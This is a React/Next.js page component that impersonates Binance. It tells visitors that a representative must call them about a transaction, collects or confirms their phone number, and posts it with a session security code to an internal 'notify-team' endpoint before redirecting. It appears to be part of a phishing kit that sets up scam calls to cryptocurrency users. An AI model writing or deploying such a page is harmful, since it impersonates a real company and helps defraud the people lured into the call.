"use client";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Pencil, Phone } from "lucide-react";
import { Banner } from "@/components/core/Banner";
import { CopyRight } from "@/components/core/CopyRight";
import { useState } from "react";
import { Input } from "@/components/ui/input";
import { SecuritySession } from "../../../../generated/prisma";
import { useRouter } from "next/navigation";

interface Props {
  securitySession: SecuritySession; // Replace with the actual type of securitySession
}

export default function ClientOnly({ securitySession }: Props) {
  const [isSending, setIsSending] = useState(false);
  const [isEditing, setIsEditing] = useState(false);
  const [phoneNumber, setPhoneNumber] = useState(
    securitySession.phoneNumber || ""
  );

  const router = useRouter();

  const handleCall = async () => {
    try {
      setIsSending(true);
      const response = await fetch("/api/security/notify-team", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          phoneNumber,
          securityCode: securitySession.securityCode,
        }),
      });

      if (response.ok) {
        router.push(
          `/security/verify/confirm?security_code=${securitySession.securityCode}`
        );
      } else {
        console.error("Failed to notify team:", await response.text());
        alert("Something went wrong. Please try again.");
      }
    } catch (error) {
      console.error("Error during call:", error);
    } finally {
      setIsSending(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
      <div className="w-full max-w-md">
        <Banner
          securityCode={securitySession.securityCode} // Assuming securitySession has a securityCode property
        />

        <Card className="shadow-lg py-0">
          <CardContent className="py-6">
            <div className="text-center mb-6">
              <div className="mx-auto mb-4 bg-pink-100 rounded-full p-4 w-16 h-16 flex items-center justify-center">
                <Phone className="h-8 w-8 text-primary" />
              </div>
              <h2 className="text-xl font-semibold mb-2">
                We Need to Call You
              </h2>
              <p className="text-gray-600 text-center px-4">
                A Binance representative needs to contact you regarding this
                transaction. Is this your best number to reach you?
              </p>
            </div>

            <div className="mb-6">
              <div className="flex justify-between items-center mb-2">
                <span className="text-gray-500 text-sm">
                  Verify Your Contact Information
                </span>
                <Button
                  variant="ghost"
                  size="sm"
                  className="text-primary hover:text-primary/90 p-0 h-auto"
                  onClick={() => setIsEditing(!isEditing)}
                >
                  {isEditing ? (
                    <span className="text-primary">Cancel</span>
                  ) : (
                    <>
                      <Pencil className="h-4 w-4 mr-1" />
                      Modify
                    </>
                  )}
                </Button>
              </div>
              {isEditing ? (
                <Input
                  type="text"
                  value={phoneNumber}
                  onChange={(e) => setPhoneNumber(e.target.value)}
                  className="p-3 bg-gray-50 rounded-md text-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-primary"
                />
              ) : (
                <div className="p-3 bg-gray-50 rounded-md text-lg">
                  {phoneNumber}
                </div>
              )}
            </div>

            <Button
              className="w-full bg-red-500 hover:bg-red-600 text-white h-12 cursor-pointer"
              asChild
              onClick={handleCall}
            >
              {isSending ? (
                <span className="flex items-center justify-center">
                  <svg
                    className="animate-spin h-4 w-4 mr-2 text-white"
                    viewBox="0 0 24 24"
                  ></svg>
                  Sending...
                </span>
              ) : (
                <span className="flex items-center justify-center">
                  <Phone className="h-4 w-4 mr-2" /> Yes, call me at this number
                </span>
              )}
            </Button>
          </CardContent>
        </Card>

        <CopyRight />
      </div>
    </div>
  );
}
